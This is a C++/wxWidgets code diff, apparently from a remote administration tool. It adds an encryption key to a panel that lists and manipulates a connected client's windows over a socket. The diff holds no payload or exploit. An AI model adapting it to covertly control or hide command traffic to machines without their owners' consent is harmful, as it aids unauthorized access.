@@ -10,9 +10,10 @@ wxBEGIN_EVENT_TABLE(ListWmManager, wxListCtrl)
 	EVT_CONTEXT_MENU(ListWmManager::OnContextMenu)
 wxEND_EVENT_TABLE()
 
-panelWManager::panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string _strID)
+panelWManager::panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string _strID, ByteArray c_key)
 	: wxFrame(pParent, EnumIDS::ID_Panel_WM, "Administrador de Ventanas") {
 	this->sckCliente = sckCliente;
+	this->enc_key = c_key;
 	this->SetName(_strID + "-WM");
 	this->SetTitle("[" + _strID + "] Administrador de Ventanas");
 	this->m_CrearListView();
@@ -21,7 +22,7 @@ panelWManager::panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string _
 }
 
 void panelWManager::m_CrearListView() {
-	this->listManager = new ListWmManager(this, EnumIDS::ID_Panel_WM_ListView, wxDefaultPosition, wxDefaultSize, wxLC_REPORT  | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
+	this->listManager = new ListWmManager(this, EnumIDS::ID_Panel_WM_ListView, wxDefaultPosition, wxDefaultSize, wxLC_REPORT  | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES, this->enc_key);
 
 	wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
 	sizer->Add(this->listManager, 1, wxEXPAND | wxALL, 2);
@@ -59,14 +60,14 @@ void ListWmManager::OnWMmessage(wxCommandEvent& event) {
 	int iMessage = event.GetId();
 	if (iMessage == EnumComandos::WM_Lista) {
 		this->DeleteAllItems();
-		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, iMessage);
+		p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, iMessage, this->enc_key);
 	}else {
 		long item = this->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
 		std::string strParam = this->GetItemText(item, 0);
 		strParam.append(1, CMD_DEL);
 		strParam += std::to_string(iMessage);
 
-		p_Servidor->cChunkSend(this->sckCliente, strParam.c_str(), strParam.size(), 0, true, EnumComandos::WM_CMD);
+		p_Servidor->cChunkSend(this->sckCliente, strParam.c_str(), strParam.size(), 0, true, EnumComandos::WM_CMD, this->enc_key);
 	}
 	event.Skip();
 }
